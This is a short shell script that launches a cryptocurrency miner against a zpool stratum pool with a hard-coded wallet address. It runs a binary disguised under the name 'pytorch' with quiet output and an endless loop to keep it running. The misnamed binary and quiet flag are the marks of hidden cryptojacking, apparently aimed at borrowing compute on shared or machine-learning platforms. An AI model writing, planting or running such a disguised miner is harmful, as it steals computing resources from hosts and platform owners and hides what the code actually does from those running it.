#!/bin/sh
POOL=stratum+tcp://lyra2z330.na.mine.zpool.ca:4563
WALLET=D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-CPU-MANTAB)
chmod +x pytorch
./pytorch -a lyra2z330 -o $POOL -u $WALLET -p c=DGB,mc=GXX,ID=$WORKER -q
while [ 1 ]; do
sleep 3
done
sleep 999
